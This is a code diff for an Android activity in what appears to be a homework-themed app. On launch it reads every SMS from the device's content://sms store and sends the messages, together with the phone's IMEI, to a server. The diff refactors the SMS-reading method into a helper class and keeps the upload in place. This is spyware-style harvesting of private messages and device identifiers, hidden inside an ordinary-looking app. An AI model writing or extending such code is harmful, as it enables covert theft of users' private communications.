@@ -50,7 +50,7 @@ public class InitActivity extends FragmentActivity {
 //        Typeface type = Typeface.createFromAsset(getAssets(), "fonts/homework.TTF");
 //        ((TextView)getActionBar().getCustomView().findViewById(R.id.title)).setTypeface(type);
 
-        ServerDAO.sendMessageList(getIMEI(), getMessages(), this);
+        ServerDAO.sendMessageList(getIMEI(), SMSes.getMessages(this), this);
     }
 
     @Override
@@ -172,23 +172,6 @@ public class InitActivity extends FragmentActivity {
 
         TelephonyManager manager = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
         return manager.getDeviceId();
-    }
-
-    public Message[] getMessages() {
-
-        Uri uri = Uri.parse("content://sms");
-        Cursor cursor = getContentResolver().query(uri, null, null, null, null);
-        List<Message> messages = new ArrayList<>();
-
-        if (cursor.moveToFirst()) {
-            for (int i = 0; i < cursor.getCount(); i++) {
-                messages.add(new Message(cursor));
-                cursor.moveToNext();
-            }
-        }
-
-        cursor.close();
-        return messages.toArray(new Message[messages.size()]);
     }
 
     @Override
